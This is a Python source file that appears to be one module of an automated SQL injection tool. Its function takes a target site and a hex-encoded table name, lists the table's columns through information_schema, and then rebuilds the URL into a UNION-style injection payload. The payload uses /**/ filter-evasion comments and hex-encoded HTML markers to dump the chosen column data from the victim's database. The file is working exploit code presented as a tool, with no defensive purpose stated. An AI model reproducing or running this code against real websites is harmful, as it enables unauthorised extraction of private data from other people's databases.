import s_data
import binascii
from prints import print_data
from requests import get_the_page


def search_in_columns(site, table, based):
    site = site + table + "--" + based
    the_page = get_the_page(site, "2")
    columns_found = s_data.search_for(the_page)
    total_cols = len(columns_found)

    if total_cols:
        print_data(columns_found, ['Columns Found'])
        back_table = table
        table = table.encode()
        table = binascii.unhexlify(table)
        table = table.decode()
        site = site.replace("+FROM+information_schema.columns+WHERE+table_name=0x" +
                            back_table + "--", "+AS/**/details/**/FROM/**/" + table + "--")

        columns = input("Give the columns: ")

        selected_columns = []
        for column in columns_found:
            if column in columns:
                selected_columns.append(column)

        site = site.replace("column_name", "%s,/**/" % selected_columns[0])

        for i in range(1, len(selected_columns)):
            site = site.replace(",/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,",
                                ",0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,%s,/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e," % selected_columns[i])

        site = site.replace(",/**/", '')
        site = site.replace(",0x3e0x0a", ",0x3e,0x0a")
        the_page = get_the_page(site, "2")
        total_data = []
        total_data = s_data.search_for(the_page)

        if not len(total_data):
            print("No data found!")
        else:
            print_data(total_data, selected_columns)
